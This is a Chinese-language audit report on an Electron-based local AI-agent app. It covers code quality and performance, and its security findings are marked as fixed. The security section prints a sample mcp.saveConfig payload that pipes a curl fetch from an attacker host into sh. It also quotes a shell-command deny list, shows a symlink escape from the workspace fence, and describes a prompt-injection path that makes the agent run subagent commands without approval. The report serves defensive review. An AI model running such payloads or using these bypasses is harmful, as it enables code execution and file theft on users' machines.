# 代码质量审计报告 · Emperor Agent (TS/Electron 主链路)

> 审计基准 commit: `9f69edd`（工作树含未提交的 Python→TS 迁移收尾删除）· 日期: 2026-07-01 · 审计员: Claude (Sonnet 5)
> 只读审计，基于当前仓库证据；报告中"实跑通过"的命令均为本次会话中真实执行，非照抄旧记录。

---

## 修复状态（审计后更新，2026-07-01 同日）

> P0（止血）、P1（提质）以及本报告列出的 P2 收口项均已落地或完成明确决策。逐项 TDD（先写失败测试复现问题、再实现、再验证转绿）+ 全量回归以最终命令输出为准。

| 项                                                                | 状态       | 落地位置                                                                                                                                                                                                                                                                                      |
| ----------------------------------------------------------------- | ---------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| P0-1 dispatch_subagent 绕过审批                                   | **已修复** | `agent/loop.ts` 新增 `permissionOnlyControlHost()`，子代理/Team 成员的 Runner 不再传 `controlManager: null`；回归测试 `agent/loop.test.ts`                                                                                                                                                    |
| P0-2 工作区围栏符号链接逃逸                                       | **已修复** | `tools/filesystem.ts::resolvePath` 增加 `realExisting()` realpath 包含性检查；回归测试 `tools.test.ts`（含实测符号链接场景）                                                                                                                                                                  |
| P0-3 scheduler 竞态丢更新                                         | **已修复** | `scheduler/service.ts` 接入已有的 `appendAction`/`mergeActions` 机制，不再整表覆盖写；回归测试 `scheduler/scheduler.test.ts`                                                                                                                                                                  |
| P0-4 核心记忆文件非原子写                                         | **已修复** | `memory/store.ts::writeMemory/writeUser` 改用 `MemoryVersionStore.atomicWriteText`（tmp+rename）；回归测试 `memory/store-atomic-write.test.ts`                                                                                                                                                |
| P0-5 IPC 层高危变更操作无授权门                                   | **已修复** | `api/core-api.ts` 的 `mcp.saveConfig`/`model.saveConfig`/`model.saveOnboardingConfig`/`config.save` 接入 `assertCoreMutationAllowed`；回归测试 `api/core-api.test.ts`                                                                                                                         |
| P1-1 run_command 拒绝列表 + AUTO 模式高危命令                     | **已修复** | `tools/builtin.ts` 拒绝列表新增 `ln -s`/其他解释器 `-e`；`permissions/pipeline.ts` AUTO 模式下高危命令仍需审批；回归测试 `permissions.test.ts`、`tools.test.ts`                                                                                                                               |
| P1-2 onboarding 密钥掩码回填缺口                                  | **已修复** | `config/model-config.ts::buildWizardModelConfig` 把 `'***'` 占位符和空值同等回退到旧密钥；回归测试 `model-config.test.ts`                                                                                                                                                                     |
| P1-3 渲染进程流式持久化未 debounce                                | **已修复** | `useRuntime.ts` 新增 debounce（400ms）+ `busy: true→false` 立即 flush；回归测试 `useRuntime.test.ts`                                                                                                                                                                                          |
| P1-4 无界增长（plans/token-tracker/team-bus）                     | **已修复** | `plans/store.ts` 补月度归档（对齐 `tasks/store.ts`）；`team/bus.ts` 只归档已读前缀、游标同步前移；`token-tracker.ts` 已支持 `tokens_archive/YYYY-MM.jsonl.gz` 月度热段归档，聚合统计/最近调用跨归档+热段读取；回归测试 `memory/compactor-token.test.ts`、`memory/token-tracker-cache.test.ts` |
| P1-5 Team/Watchlist 损坏文件静默丢弃                              | **已修复** | 两处改为先 `*.corrupt-<ts>` 隔离备份再回退默认，对齐 `plans/tasks/scheduler` store 已有约定；回归测试 `team.test.ts`、`watchlist.test.ts`                                                                                                                                                     |
| P1-6 runner.ts god-method + 前端重复代码                          | **已修复** | `agent/runner.ts` 抽出纯展示逻辑到新文件 `runner-thoughts.ts`；`useRuntime.ts`/`utils/format.ts` 的 `compactJson` 重复定义已去重；`Composer.vue` model/mode 悬浮菜单抽到 `floatingMenu.ts`，用 `floatingMenu.test.ts` 覆盖定位行为                                                            |
| P1-7 缺 ESLint                                                    | **已修复** | `packages/core` + `desktop` 各自新增 flat config（`eslint.config.js`）+ `lint` script，接入 `scripts/check.sh` 和 CI；顺手清掉了全部既有 lint 违规（32 + 4 处，多为死 import），两端 0 warning                                                                                                |
| bonus：`.gitignore` 吞掉整个 `packages/core/src/memory/` 源码目录 | **已修复** | 裸 `memory/` 规则匹配到同名源码目录，导致该子系统从未被 git 追踪；加 `!packages/core/src/memory/**` 负规则解除                                                                                                                                                                                |

### P2 收口状态

- MCP 工具结果已补“不可信输入”标注，并通过结构化 `ToolResult` 透传协议级 `isError`；回归测试 `mcp/mcp.test.ts`。
- 渲染进程 `WsEvent` 已绑定 `@emperor/core` 导出的 `RuntimeEvent` 基础 union，降低 runtime event 类型漂移风险。
- `api/http.ts` 新增 `callCore()` 路由 helper，已收敛普通 bootstrap/session/control/stop 等 mapped 调用点；chat submit、Core event 订阅、multipart skill import 仍保留专用 IPC。
- 已补 `SECURITY.md` 与 `CHANGELOG.md`。
- 覆盖率门禁决策：当前不设硬阈值。理由是迁移收口阶段仍以全量 vitest + typecheck + eslint + build 为硬门禁；等 CI 积累稳定 coverage baseline 后，再引入按包分阶段阈值，避免用任意阈值阻塞必要迁移修复。

---

## 与旧报告的关系

仓库根目录的 `PROJECT_AUDIT_REPORT.md`（2026-06-25）审的是 Python 后端（`agent/`、`aiohttp web/`）。该后端已经从磁盘完全删除——`git status` 里 400+ 处 `D` 就是这次迁移的收尾。当前代码库是纯 TypeScript：Electron 主进程内直接托管 `@emperor/core`，不再有 HTTP/WS server、不再有 Python CLI。旧报告的结论（origin_guard、auth_guard、tasks/store 月度归档等）**已随 Python 代码一起作废**，不再适用；本报告是新架构下的独立、从零开始的审计，两份报告应并存作为迁移前后的快照对比，不建议互相替代。

---

## 一、项目基本信息

- 名称：Emperor Agent（皇帝智能体）
- 类型：本地个人 Agent 工作台，Electron 桌面应用
- 部署上下文：**本地单用户桌面应用**，无对外网络服务；但 Electron 渲染进程加载 Vue 应用并可能渲染远程图片/链接/Markdown，主进程持有文件系统与子进程执行能力——渲染进程↔主进程的 IPC 边界，以及"模型可调用工具"这两条链路，是本应用现存的两条真实信任边界（详见第八节）
- 审计目的：迁移完成后的整体健康巡检，为后续商业化/多人协作/继续加功能提供决策依据
- 审计范围：全仓库同等深度，覆盖 `packages/core/src`（核心业务逻辑）、`desktop/src`（Electron 主进程/preload/渲染进程）、`desktop-pet/`（桌面宠物子项目）、`skills/*/scripts/*.py`（独立技能脚本）

### 技术栈

- 核心逻辑：TypeScript（`@emperor/core`，Node.js ≥22），`strict: true` + `noUncheckedIndexedAccess`
- 桌面壳：Electron 42 + Vue 3（`electron-vite`、`vue-tsc`）
- 存储：本地文件系统 JSON/JSONL（`memory/`），无数据库
- 测试：Vitest（core 46 测试文件 / 282 用例，desktop 42 测试文件 / 152 用例）
- CI：GitHub Actions，`ubuntu/macos/windows` 三平台矩阵

---

## 二、目录结构

```text
packages/core/src/    @emperor/core：agent api attachments compat config control
                       external mcp media memory model permissions plans providers
                       runtime scheduler sessions store subagents tasks team tools
                       watchlist  (~24k LoC TS, 20 个子系统)
desktop/src/
  main/                Electron 主进程：index/ipc/protocol/config/window-bounds/core-host
  preload/             contextBridge 桥接层
  renderer/src/        Vue3 UI：composables/components/capabilities/runtime
desktop-pet/           独立桌面宠物子项目（纯 JS，~0.9k LoC）
skills/*/scripts/*.py  独立技能脚本工具（~0.9k LoC，开发者本地调用，非主链路）
memory/, sessions/     运行期数据（非源码，已默认降权）
```

**优点**：`packages/core` 与 `desktop` 边界清晰（核心逻辑/UI 分离），`core` 内部按子系统平铺、无深层嵌套，每个子系统配一份 `<subsystem>.test.ts`。
**问题**：无。目录结构本身是本次审计中最健康的维度之一。
**风险等级**：低
**是否建议重构目录结构**：否

---

## 三、技术栈与依赖审计

### 依赖使用率核查（实跑 grep 统计，非猜测）

| 包                                                                                     |       core 引用文件数 | 结论                                                                                                                                                              |
| -------------------------------------------------------------------------------------- | --------------------: | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `@anthropic-ai/sdk` / `@modelcontextprotocol/sdk` / `croner` / `jsonrepair` / `openai` |                     1 | 均在用                                                                                                                                                            |
| `vitest`（core）                                                                       |                    46 | 测试框架，正常                                                                                                                                                    |
| `vue` / `vue-router`                                                                   |                52 / 8 | 均在用                                                                                                                                                            |
| `@emperor/core`（desktop）                                                             |                     1 | workspace 内引用，正常                                                                                                                                            |
| `electron-builder` / `postcss` / `tailwindcss` / `vue-tsc` / `@vitejs/*` 等            | 0（源码 grep 命中数） | **非死依赖**——均为构建期/类型期工具，通过配置文件（`electron-builder.yml`、`tailwind.config.ts`、`package.json#scripts`）消费，不会在 `import` 里出现，误报已排除 |

### 结论

- **无真实死依赖**——这是相对少见的干净状态，说明 workspace 依赖管理是认真做的。
- 无 `requirements.txt` 式的传递依赖钉死问题（package-lock.json 走 npm 标准锁定）。
- 无高风险依赖（未见已知 CVE 重灾区的旧版本包；`electron ^42` 较新）。

### 优化建议

- 无阻塞项。可选：给 `desktop/package.json` 加 `"type": "module"`——`npm run test` 输出里有 `MODULE_TYPELESS_PACKAGE_JSON` 警告（`postcss.config.js` 被当 CJS 猜测解析），不影响功能但值得清理。

---

## 四、代码质量审计

| 维度     | 分数 | 依据                                                                                                                              |
| -------- | ---: | --------------------------------------------------------------------------------------------------------------------------------- |
| 命名规范 | 8/10 | TS 端 camelCase 一致；磁盘格式刻意保留 Python 时代的 snake_case（`toDict`/`fromDict` 双向兼容），是有意为之的迁移约定，非风格混乱 |
| 可读性   | 7/10 | 多数模块单一职责清晰；`runner.ts::stepAsync`、`Composer.vue` 是明显例外（见下）                                                   |
| 可维护性 | 6/10 | 见问题 1-4；`control/manager.ts` 反而是正面案例（见"检查后确认健全"）                                                             |
| 解耦程度 | 6/10 | `useRuntime.ts` 与 `api/http.ts` 之间存在 15+ 处手写重复分支，而非复用已有的 `coreRoute()` 映射表                                 |
| 可扩展性 | 7/10 | 子系统边界清晰，新增工具/子系统的模式已被反复验证（20 个子系统均遵循同一 store/service 分层）                                     |

### 主要问题

#### 问题 1 · `AgentRunner.stepAsync` 是 238 行的单体方法，混合 8 类职责

- **文件位置**：`packages/core/src/agent/runner.ts:235-472`
- **问题描述**：一个 `while(true)` 循环里同时处理模型调用、token/usage 统计、memory checkpoint、工具调度与暂停、空响应重试、截断恢复、Ask/Plan 守卫暂停、todo/plan/verification 续写、压缩触发——约 15 条 early-return/continue 路径。534 行的 `runner.test.ts` 本身就是覆盖成本高的证据。
- **代码片段**：
  ```ts
  async stepAsync(history: Msg[], opts?: {...}): Promise<string> {
    while (true) {
      // 模型调用 → usage 记账 → memory checkpoint → 工具调度(+TurnPaused捕获)
      // → 空响应重试 → 截断恢复 → Ask/Plan 守卫暂停 → todo/plan/verification 续写 → 压缩触发
    }
  }
  ```
- **影响**：修改任一分支都容易漏掉某个 checkpoint 写入、事件发射或状态迁移，且难以在 review 中察觉。
- **解决方案**：抽出 `runner-thoughts.ts`（`toolIntentSummary`/`toolPurposeSummary`/`toolResultSummary`，第 855-920 行，纯展示逻辑与状态机无关）；把空响应重试/截断恢复/todo-followup/plan-followup/verification-followup（形状高度相似：判断条件→push messages→emit phase→continue）收敛进一个 `TurnStepHandlers` 模块，与已经存在的 `runner-helpers.ts` 保持同一抽取粒度。

#### 问题 2 · `Composer.vue` 中两套悬浮菜单逻辑逐行重复（~90 行 ×2）

- **文件位置**：`desktop/src/renderer/src/components/chat/Composer.vue:407-542`
- **审计后状态**：已处理。model/mode 浮层共用 `desktop/src/renderer/src/components/chat/floatingMenu.ts`，定位计算由 `floatingMenu.test.ts` 覆盖。
- **问题描述**：mode 菜单与 model 菜单各自实现一套定位/外部点击关闭/焦点捕获逻辑，仅变量名不同（`positionModeMenu` vs `positionModelMenu`、`addModelMenuListeners` vs `addModeMenuListeners` 等 6 组函数对）。
- **代码片段**：
  ```javascript
  function positionModelMenu() {
    const button = modelButton.value
    const menu = modelMenu.value
    if (!button || !menu) return
    const margin = 12
    const gap = 8
    // ... 与 positionModeMenu 逐行相同，仅 ref 不同
  ```
- **影响**：目前两份实现同步，但没有任何机制保证未来修改不会漂移；新增第三个菜单（如已有的 model/mode 之外）需要再复制一遍。
- **解决方案**：
  ```ts
  function useFloatingMenu(
    buttonRef: Ref<HTMLElement | null>,
    menuRef: Ref<HTMLElement | null>,
  ) {
    // 定位 + outside-click + focus-trap，返回 { open, style, toggle, close }
  }
  ```
  两个菜单改为调用同一个 composable，可直接移除 Composer.vue 中约 90 行重复代码。

#### 问题 3 · `compactJson` 在两处重复定义，默认值不一致

- **文件位置**：`desktop/src/renderer/src/utils/format.ts:28-32`（limit=160） vs `desktop/src/renderer/src/composables/useRuntime.ts:24-28`（limit=180）
- **问题描述**：两份实现字节级相同，仅截断长度不同；`useRuntime.ts` 完全没有 import `utils/format.ts`，是无意识的重复而非刻意差异化。
- **影响**：行为不一致是意外产生的（同一数据在不同展示位置截断长度不同），且给未来维护者错误信号（以为差异是有意义的）。
- **解决方案**：删除 `useRuntime.ts:24-28`，改为 `import { compactJson } from '../utils/format'`，在两个调用点显式传参数一致化。

#### 问题 4 · `hasCoreBridge() ? invokeCore(...) : fetch(...)` 双路径分支手写重复 15+ 处

- **文件位置**：`useRuntime.ts:280-299`（`stopActive`）、`App.vue:375-401`（`setControlMode`）等，完整清单见 Track E 详细记录；`api/http.ts:71-72` 的 `coreRoute()` 已经为这两个操作提供了映射
- **审计后状态**：已处理 mapped REST 调用点。`api/http.ts` 新增 `callCore()`，普通 bootstrap/session/control/stop 等路径统一走 `api()`；chat submit、Core event 订阅、multipart skill import、模型连通性测试保留专用 IPC。
- **问题描述**：`api/http.ts` 已经封装了统一的 `api<T>(path, options)` 桥接层，但 15+ 处调用点绕过它手写同样的分支逻辑，导致"某个 operation 该怎么路由到 core"存在两份并行的事实来源。
- **影响**：非功能性 bug（目前两边手动保持同步），但任何路由变更需要同时改映射表和所有手写分支，容易漏改。
- **解决方案**：新增 `callCore<T>(op: string, coreArgs: unknown[], restPath: string, restInit: RequestInit): Promise<T>` 辅助函数，逐步收敛调用点。

### 检查后确认健全

- `control/manager.ts`（508 LoC，本次扫描到的最大文件之一）**不是 God-class**——委托给 8 个职责分明的子管理器（`ControlStore`/`PlanStore`/`ControlPolicy`/`ClarificationPolicy`/`PlanDecisionPolicy`/`PermissionManager`/`PlanPermissionTokenManager`/`PlanVerificationManager`/`PlanDraftingManager`/`PlanExecutionManager`），自身方法几乎全是薄封装，是合理的 facade 模式。
- 全仓库（`packages/core/src` + `desktop/src`）`: any`/`as any` 仅 40 处，绝大多数集中在"解析外部 LLM 响应"这一天然需要弱类型的边界（且有 `?? ''`/`jsonrepair` 防御性兜底），非滥用；`@ts-ignore`/`@ts-expect-error` 全仓库 0 处。
- TODO/FIXME/HACK/XXX 标记 85 处，抽查未发现遗留的"半成品"逻辑，多为可读性注释性质的待办，非阻塞性技术债信号。

---

## 五、架构审计

### 分层情况

- **表现层**：`desktop/src/renderer`（Vue3），通过唯一入口 `window.emperor.invokeCore`/`onCoreEvent` 与核心通信，不直接触碰文件系统/子进程
- **业务层**：`packages/core/src`，20 个子系统按"领域"平铺（非按"层"分），每个子系统内部遵循 `store.ts`（持久化）→ `service.ts`/`manager.ts`（业务逻辑）→ `*.test.ts` 的一致模式
- **基础设施层**：`store/atomic-json.ts`、`store/jsonl.ts`、`store/file-lock.ts` 提供跨子系统共享的原子写入/JSONL 追加/文件锁原语——**但 `file-lock.ts` 目前是死代码，没有任何子系统实际使用它**（见七、性能审计问题 1）

### 问题

- **模块边界**：`dispatch_subagent` 工具创建的子 `AgentRunner` 被硬编码传入 `controlManager: null`（`agent/loop.ts:160,328`），意味着子代理执行的工具调用完全绕开父级的模式/审批/风险评估——这不是某个函数的 bug，而是"权限系统覆盖范围"这一架构决策的真实缺口，详见第八节安全审计问题 1。
- **数据流**：渲染进程→主进程的 IPC 是"通用操作名转发"模式（`desktop/src/main/ipc.ts`），没有按操作的敏感度分级——所有 CoreApi 上的可变更操作（含 `mcp.saveConfig` 这种能引发子进程 spawn 的操作）与只读查询走同一条无差别授权路径。这是应用整体信任模型里唯一真正"新"的攻击面（HTTP server 时代不存在，是迁移到 IPC 拓扑后引入的），详见第八节问题 3。
- **状态管理**：`SchedulerService.onTimer`/`runJob` 把 `store.load()` 的快照跨越多个 `await` 点持有后再整体 `save()`，与并发的同步 CRUD 操作（`addJob`/`removeJob` 等）之间存在"讨论了但没接上"的并发设计——`store/file-lock.ts` 和 `scheduler/store.ts` 里的 `appendAction`/`mergeActions` write-ahead-log 机制明显是为此设计的，但从未被 `SchedulerService` 调用，详见第六节问题 1。
- **核心逻辑分布**：`memory/`、`sessions/`、`plans/`、`tasks/`、`scheduler/`、`store/`、`attachments/`、`media/`、`watchlist/`、`team/` 这十个子系统里，只有 `tasks/store.ts` 实现了"终态数据月度归档 + 只加载热索引"的无界增长防护；其余（尤其 `plans/store.ts`）明显是同一模式本该复用但没有推广的例子。

### 评级

**B**（良好但有真实缺口）—— 整体分层清晰、约定一致（这点做得比很多个人项目扎实很多），但权限系统的覆盖边界与状态并发模型存在需要在 P0/P1 就处理的架构级缺口，不是"锦上添花"级别的问题。

---

## 六、核心业务逻辑审计

| 模块                                                                       | 职责                     | 风险等级                            |
| -------------------------------------------------------------------------- | ------------------------ | ----------------------------------- |
| `tools/` + `permissions/` + `control/`                                     | 工具执行 + 审批闸门      | **高**（问题 1-4，见下）            |
| `scheduler/`                                                               | 定时/后台任务            | **高**（并发竞态，问题见下）        |
| `memory/`                                                                  | 长期记忆 + 会话历史      | **高**（核心记忆文件非原子写）      |
| `agent/`（runner/loop）                                                    | 回合状态机               | 中（god-method，功能正确）          |
| `api/` + `config/`                                                         | IPC 门面 + 模型配置/密钥 | 中（onboarding 掩码回填缺口）       |
| `sessions/` `plans/` `tasks/` `team/` `watchlist/` `attachments/` `media/` | 各类存储型子系统         | 低-中（原子写普遍正确，部分缺归档） |

### 模块详细分析

#### `tools/` + `permissions/` + `control/`（工具执行与审批）

- **输入**：模型产出的工具调用（`run_command`/`read_file`/`write_file`/`dispatch_subagent`/MCP 工具等），部分参数间接来自不可信来源（网页抓取内容、MCP 服务器返回、外部消息桥）
- **输出**：文件读写、子进程执行、子代理派发
- **状态变化**：`PermissionManager` 根据模式（chat/build/plan/auto）+ 风险分类决定放行/拒绝/需审批
- **风险点**：见第八节问题 1、2、3、4——`dispatch_subagent` 完全跳过审批、`filesystem.ts` 工作区围栏可被符号链接绕过、`run_command` 拒绝列表覆盖面窄、`AUTO` 模式下审批层整体关闭且残余防线（工作区围栏+拒绝列表）本身有漏洞。
- **建议**：这四项应作为一个整体处理（P0），因为它们互相叠加——`dispatch_subagent` 绕过审批 + `run_command` 在子代理里可用 + 拒绝列表能被 `ln -s` 绕过，链起来是一条完整的"模型可在无审批情况下读写工作区外任意文件"路径。

#### `scheduler/`（定时任务）

- **输入**：`addJob`/`updateJob`/`removeJob`（同步全量 load→mutate→save）与 `onTimer`/`runJob`（异步，跨 `await` 持有旧快照）
- **输出**：`jobs.json` 全量重写
- **风险点**：竞态导致的数据丢失——已执行中的长任务 tick 可能在结束时用过期快照覆盖掉运行期间用户做的增删改（详见第七节问题 1，附具体场景）。
- **建议**：接入代码里已经写好但从未使用的 `appendAction`/`mergeActions`/`withLock` 机制（P0）。

#### `memory/`（长期记忆）

- **输入**：`Compactor.compactMessages()` 在压缩时依次调用 `appendEpisode → writeMemory → writeUser`
- **输出**：`MEMORY.local.md`（"此文件常驻上下文"）、`USER.local.md`
- **风险点**：这两个文件用 `writeFileSync` 直接覆盖写，而同一个类里的 `writeCheckpoint` 三行之外就是正确的 tmp+rename 实现——崩溃/断电可截断核心记忆且无任何检测机制（其他 JSON store 都有 corrupt-isolation，这两个纯文本文件连"检测到损坏"这一步都没有）。
- **建议**：复用同类已有的 `MemoryVersionStore.atomicWriteText()` 或 `writeCheckpoint` 同款 tmp+rename 模式（P0）。

---

## 七、性能审计

| 文件                                                             | 问题                                                                                                                                 | 风险等级 | 优化方案                                                                                                   |
| ---------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------ | -------- | ---------------------------------------------------------------------------------------------------------- |
| `desktop/src/renderer/src/composables/useRuntime.ts:61-65`       | 全量 `deep: true` watch 触发 `JSON.stringify` 全会话快照 + 同步 `localStorage.setItem`，流式 token 到达时高频触发                    | 高       | 对 `persistRuntimeSnapshot` 做 debounce（300-500ms），仅在 `assistant_done`/`turn_paused` 等终态立即 flush |
| `packages/core/src/memory/history.ts:32-42`                      | `HistoryLog.append()` 在**每条消息**写入时都同步 `readdirSync`+`statSync` 全部历史归档文件来重算统计                                 | 中       | 统计只在显式查询（诊断面板）时懒计算，append 路径只维护 `latest_seq`                                       |
| `packages/core/src/memory/token-tracker.ts`                      | token 用量日志永久追加、无归档，每次统计查询全文件重新解析                                                                           | 中       | 按月归档（复用 `memory/history.ts` 已有的 `history_archive/<month>.jsonl.gz` 模式）                        |
| `packages/core/src/team/bus.ts`                                  | 每个 actor 的 inbox JSONL 永久增长，`read/recent/unreadCount` 每次全量重解析，且绕开了项目里已有的 `store/jsonl.ts` 工具             | 中       | 改用已存在的 `appendJsonl`/`readJsonl`/`rotateToArchive`                                                   |
| `desktop/src/renderer/src/components/chat/MessageList.vue:21-25` | 对同一 `messages` 数组存在**第二个**独立 `deep: true` watch（第一个在 `useRuntime.ts`），叠加逐条消息未 memo 化的字符串/正则辅助函数 | 中       | 用 `computed`/按消息 id memo 化，避免流式更新时对全部历史消息重跑格式化逻辑                                |
| `packages/core/src/plans/store.ts`                               | 无归档机制，`list()`/`save()` 永远读写全量 `index.json`（对比 `tasks/store.ts` 已有月度归档）                                        | 中       | 复用 `tasks/store.ts` 的 `maxTerminal` + 月度归档模式                                                      |

- **审计后状态**：`useRuntime.ts` 已 debounce 持久化；`MessageList.vue` 已改为最新可见消息签名监听；`HistoryLog.append()` 改为增量维护热段索引；`TokenTracker` 已支持按月归档且统计跨归档读取。
- **重复计算**：见上表 `MessageList.vue`/`HistoryLog.append`
- **无效渲染**：`v-for="message in props.messages"` 无虚拟化，长会话下每次重渲染成本随消息数线性增长（与 localStorage 写入问题叠加，是同一根因：没有为"长会话"这个使用场景做过专门优化）
- **内存泄漏**：**未发现**——`Composer.vue`/`AssistantFlow.vue` 的所有 `setInterval`/`addEventListener` 均有对应清理逻辑，逐一核对无遗漏；`useRuntime` 的 WS/IPC 连接在应用生命周期内是单例设计（`App.vue` 作为 SPA 根节点从不卸载），不需要 `onUnmounted` 清理
- **DB 查询性能**：不适用（无数据库）
- **缓存策略**：`ModelRouter`/`ProviderSnapshot` 等核心路径无明显重复请求问题；主要缺口集中在"文件系统当数据库用却没有加索引/归档"这一类

---

## 八、安全审计

| 检查项                         | 状态                                               | 风险           |
| ------------------------------ | -------------------------------------------------- | -------------- |
| API Key 泄露                   | 基本健全，1 处流程缺口                             | 中（见问题 5） |
| Token 泄露                     | N/A（无 Web session token，IPC 拓扑下不适用）      | —              |
| SQL 注入                       | N/A（无数据库）                                    | —              |
| XSS                            | 未发现（渲染进程仅 `textContent`，无 `innerHTML`） | 低             |
| 文件上传风险                   | 附件/媒体 ID 正则先行校验，路径穿越已挡            | 低             |
| 命令注入 / RCE                 | **存在真实路径**（问题 1-4 叠加 + 问题 3）         | **高**         |
| 权限绕过                       | **存在**（问题 1）                                 | **高**         |
| CORS                           | N/A（无 HTTP server）                              | —              |
| 路径穿越                       | **工作区围栏可被符号链接绕过**（问题 2）           | **高**         |
| Prompt injection（agent 项目） | 大部分链路有防御性标注，MCP 结果缺失               | 中（问题 6）   |

### 高危问题

#### 问题 1 · `dispatch_subagent` 完全绕开审批/权限管道

- **文件位置**：`packages/core/src/agent/loop.ts:160, 328`（`controlManager: null`），触发点 `packages/core/src/agent/runner.ts:565-573`
- **描述**：`AgentRunner.runToolResult()` 只在 `this.controlManager !== null` 时才调用 `PermissionManager.assess()`。子代理的 Runner 被硬编码传入 `controlManager: null`，因此子代理内部的工具调用完全跳过模式检查、高危命令审批、敏感路径审批、plan 模式只读限制。`subagents/registry.ts` 确认多个内建子代理规格里包含 `run_command`/`write_file`/`edit_file`。
  ```ts
  // agent/loop.ts:318-329
  runnerFactory: buildDispatchRunnerFactory({
    modelRouter: this.modelRouter, tokenTracker: this.tokenTracker,
    memoryStore: null, compactor: null, todoStore: null,
    controlManager: null,   // ← 子代理审批被整体关闭
  }),
  ```
- **实际路径**：在应用默认的 `ask_before_edit` 安全模式下，顶层 agent 只要调用 `dispatch_subagent`，子代理内的任意 shell 命令/文件写入就会**零审批直接执行**，与该模式向用户承诺的"危险操作需要确认"完全相悖。叠加 prompt-injection（例如 `web_fetch`/MCP 工具返回的恶意内容诱导顶层模型派发一个执行危险命令的子代理），构成从"不可信内容"到"未经批准执行 shell 命令"的完整链路。
- **解决方案**：
  ```ts
  // 把父级 controlManager（或其只读安全变体）传给 dispatch runner，
  // 或在 DispatchSubagentTool.execute 内部为每次子工具调用显式复用父级 PermissionManager.assess()
  runnerFactory: buildDispatchRunnerFactory({
    ...,
    controlManager: this.controlManager,
  }),
  ```

#### 问题 2 · 工作区文件围栏仅做词法比较，符号链接可逃逸（已实测验证）

- **文件位置**：`packages/core/src/tools/filesystem.ts:41-54`
  ```ts
  const rel = relative(ws, resolved)
  if (rel.startsWith('..') || resolve(rel) === rel) {
    if (rel.startsWith('..')) throw new Error(...)
  }
  ```
- **描述**：`path.resolve`/`path.relative` 纯词法计算，从不触碰文件系统、不解引用符号链接。若工作区内存在指向工作区外的符号链接（`workspace/link -> /Users/me/secret`），`resolved` 词法上仍属于 `workspace/`，围栏判定"未逃逸"，但后续 `fsReadFile`/`fsWriteFile` 在 OS 层面会跟随符号链接读写真实的外部目标。
- **实测**：
  ```
  $ ln -sf ../secret/passwd.txt workspace/link_out
  rel: link_out   escape detected (词法判定): false
  realpath: .../secret/passwd.txt
  经 resolved path 实际读到的内容: TOP SECRET
  ```
- **影响**：只要工作区内能创建一个符号链接（`run_command` 里的 `ln -s` 并不在 `RunCommand` 的拒绝列表中，见问题 3），`read_file`/`write_file`/`edit_file` 就能读写 OS 用户权限范围内的任意文件——完全绕过工具描述里承诺的"安全读取工作区内"。
- **解决方案**：
  ```ts
  // 计算 resolved 后，对其（或对新建文件时的父目录）做 realpath 再做包含性判断
  const real = await fs.promises.realpath(resolved).catch(() => resolved)
  const rel = relative(ws, real)
  if (rel.startsWith('..')) throw new Error(...)
  ```

#### 问题 3 · IPC 通用转发暴露全部可变更 CoreApi，缺少按操作的授权分级

- **文件位置**：`desktop/src/main/ipc.ts:10-20`、`desktop/src/preload/core-ipc.ts:11-15`；关键 pivot：`packages/core/src/mcp/connection.ts:57`（`StdioClientTransport` spawn）
- **描述**：`registerCoreIpc` 确实built了一份真实白名单——channel 名只能来自编译期常量 `CORE_API_ROUTE_OPERATIONS`，渲染进程无法凭空发明新 channel。但这份白名单本身就是应用**全部**可变更操作（含 `mcp.saveConfig`/`model.saveConfig`/`sessions.delete`/`memory.restoreVersion` 等），而现有的 `assertCoreMutationAllowed` 只是"审批/plan 待定时禁止变更"的工作流状态检查，**不是授权边界**，且只接入了 `scheduler.*`/`team.*`/`desktopPet.setEnabled`，`config.save`/`mcp.saveConfig`/`model.saveConfig` 等完全没有任何门槛。
- **具体可执行 pivot**：渲染进程侧的任意 JS（供应链投毒的 npm 依赖、或渲染 Markdown/链接时的潜在注入）可以直接 `invokeCore('mcp.saveConfig', { mcpServers: { evil: { command: 'bash', args: ['-c', 'curl attacker/x|sh'] } } })`，写盘后 `reloadMcp()` 触发 `StdioClientTransport` 把该命令当子进程 spawn——**一条从渲染进程 JS 到主进程任意命令执行的完整链路**，且无任何弹窗确认。
- **解决方案**：把 `CORE_API_ROUTE_OPERATIONS` 拆成只读/可变更两类，对能引发代码执行的高危操作（尤其 `mcp.saveConfig`、`model.saveConfig`）在主进程加一道真实确认门（`dialog.showMessageBox`，或要求绑定真实用户手势的短时 capability token），而不是"渲染进程发了 IPC 消息"本身就等于授权。

#### 问题 4 · `run_command` 拒绝列表覆盖窄，`AUTO` 模式下审批整体关闭

- **文件位置**：`packages/core/src/tools/builtin.ts:269-281`（`DENY_PATTERNS`）、`packages/core/src/permissions/pipeline.ts:40-43`
  ```ts
  const DENY_PATTERNS = [
    /\brm\s+-rf\s+\//,
    /\bmkfs\./,
    /\bdd\s+if=/,
    /:\s*\(\s*\)\s*\{/,
    />\s*\/dev\/sda/,
    />\s*\/dev\/nvme/,
    /\bcurl\b/,
    /\bwget\b/,
    /\bpython3?\s+-c\b/,
    /\|.*\bsh\b/,
    /\|.*\bbash\b/,
  ]
  ```
- **描述**：工具描述宣称"危险模式会被安全策略直接拒绝"，但 `rm -rf ~`/`ln -s`（问题 2 的前置条件）/`perl -e`/`node -e`/`osascript -e`/`nc`/`scp` 等均不在列表内，属于"防了几个字面量模式"而非真正沙箱。`AUTO` 模式（`permissions/pipeline.ts:40-43`）设计上直接跳过整个审批层，此时唯一的残余防线就是这份不完整的拒绝列表加上问题 2 有漏洞的工作区围栏。
- **影响**：`AUTO` 模式下模型（或被注入的指令）可以轻易绕过"安全策略"完成危险操作，而应用文档给用户的印象是"仍受工具自身安全策略约束"，与实际防护力不符。
- **解决方案**：不建议依赖黑名单当安全边界——要么把高危命令判定（`isHighRiskCommand`）即便在 AUTO 模式下也路由回审批（作为"仍需人工确认危险操作"的最后防线），要么明确在文档/工具描述里把黑名单标注为"尽力而为的误操作防护，非沙箱"，避免过度承诺。

### 中危问题

#### 问题 5 · Onboarding 向导保存路径遗漏密钥掩码回填

- **文件位置**：`packages/core/src/api/services/model-service.ts:90-97`
